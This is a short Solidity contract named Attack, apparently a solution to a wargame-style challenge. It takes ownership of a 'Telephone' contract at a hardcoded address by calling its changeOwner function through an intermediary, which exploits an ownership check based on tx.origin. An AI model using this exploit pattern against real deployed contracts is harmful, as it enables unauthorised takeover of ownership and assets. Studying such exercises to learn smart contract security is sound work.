//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Attack{
    ITelephone constant instance = ITelephone(0x796d3b722A5b1568B8494AaA1caDA3E7DD47E3fE);

    function changeOwner() external{
        instance.changeOwner(msg.sender);
    }
}